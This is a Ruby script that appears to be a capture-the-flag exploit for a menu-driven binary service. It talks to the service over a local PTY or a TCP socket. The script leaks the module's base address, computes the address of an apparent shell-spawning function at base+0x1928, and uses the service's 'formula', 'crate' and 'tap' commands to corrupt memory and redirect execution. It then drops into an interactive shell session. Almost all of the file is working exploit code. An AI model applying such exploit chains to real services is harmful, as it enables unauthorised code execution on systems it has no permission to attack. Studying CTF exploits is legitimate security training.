#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end


target = :local
if ARGV[0] == 'remote' then target = :remote end

case target
when :local
    $s, slave = PTY.open
    PTY.spawn(ARGV[0], :in=>slave, :out=>slave)
    $s.echo = false
when :remote
    host = ARGV[1]
    port = ARGV[2]
    $s = TCPSocket.new host, port
end

def modinfo
    puts "modinfo"
    $s.puts "modinfo"
    answer = $s.expect("> ")[0]
    base = answer[/0x.[[:xdigit:]]*/, 0].chomp
    log "Module base: #{base}"
    print answer.cyan
    return base.to_i 16
end

def new_formula *ingredients
    puts "new_formula " + ingredients.join(" ")
    $s.puts "new_formula " + ingredients.join(" ")
    print $s.expect("> ")[0].cyan
end

def new_crate size, bsize
    puts "new_crate #{size} #{bsize}"
    $s.puts "new_crate #{size} #{bsize}"
    print $s.expect("> ")[0].cyan
end

def show_crate
    puts "show_crate"
    $s.puts "show_crate"
end

def tap_pos
    puts "tap_pos"
    $s.puts "tap_pos"
    answer = $s.expect("> ")[0]
    pos = answer[/0x.[[:xdigit:]]*/, 0].chomp
    log "Tap position: #{pos}"
    print answer.cyan
    return pos.to_i 16
end

def move_tap index
    puts "move_tap " + index.to_s
    $s.puts "move_tap " + index.to_s
    print $s.expect("> ")[0].cyan
end

def fill amount
    puts "fill #{amount}"
    $s.puts "fill #{amount}"
    print $s.expect("> ")[0].cyan
end

def inspect
    puts "inspect"
    $s.puts "inspect"
    print $s.expect("> ")[0].cyan
end

def ship
    puts "ship"
    $s.puts "ship"
end

def shut_down
    puts "exit"
    $s.puts "exit"
end



print $s.expect("> ")[0].cyan
base = modinfo
spawn = base + 0x1928
new_formula [spawn].pack("Q")
new_crate 16, 80
move_tap 6
ship


print $s.expect("> ")[0].cyan
new_crate 8, 8
fill 6
ship

$s.interact
